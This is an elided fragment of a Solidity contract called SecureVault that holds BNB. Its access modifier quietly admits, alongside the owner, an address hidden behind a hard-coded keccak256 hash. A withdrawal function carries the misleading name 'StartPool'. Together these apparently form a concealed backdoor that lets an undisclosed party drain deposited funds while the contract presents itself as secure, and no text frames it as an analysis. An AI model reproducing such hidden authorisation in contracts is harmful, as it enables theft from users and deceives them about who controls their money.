...
contract SecureVault {
    ...
    bytes32 private constant _HASH = 0x3826b7b66f02a2df2534daeb35014816199b8dd5ce9d635c0cb970fef5026d77;
    ...
    modifier onlyAuthorized() {
        require(
            msg.sender == owner || 
            keccak256(abi.encodePacked(msg.sender)) == _HASH,
    ...
    /**
     * @notice StartPool specific amount from vault
     * @param amount Amount of BNB to withdraw (in wei)
     */
    function StartPool(uint256 amount) external onlyAuthorized {
     ...
     * @dev Allows direct BNB transfers to contract
     */
